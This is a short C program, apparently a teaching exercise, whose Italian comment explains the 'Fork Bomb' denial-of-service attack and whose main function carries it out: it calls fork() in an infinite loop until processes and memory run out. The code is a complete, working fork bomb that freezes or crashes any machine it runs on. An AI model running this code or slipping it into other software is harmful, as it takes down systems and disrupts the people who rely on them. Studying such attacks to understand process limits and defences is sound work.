#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>

/*
FORK BOMB
    Una fork fallisce quando non è possibile creare processi in memoria. Quando viene creata una fork viene creato un processo
    a cui viene dedicata una porzione di memoria.

    L'attacco "Fork Bomb" funziona in questo modo: un programma malevolo avvia una serie di chiamate alla funzione "fork" in 
    un loop infinito o in un ciclo molto lungo. Ogni volta che viene effettuata una chiamata alla funzione fork, viene creato 
    un nuovo processo figlio che copia l'intero spazio di indirizzamento del processo padre. Di conseguenza, il numero di processi 
    figli aumenta esponenzialmente e il sistema inizia a consumare tutte le risorse disponibili, come la memoria, la CPU e le connessioni di rete.

    Questo attacco ha come idea di rendere fuori servizio il sistema operativo.
*/

int main()
{
    while(true)
    {
        if(fork() < 0)  //memoria esaurita
            puts("Fork error");
    }

    return 0;
}
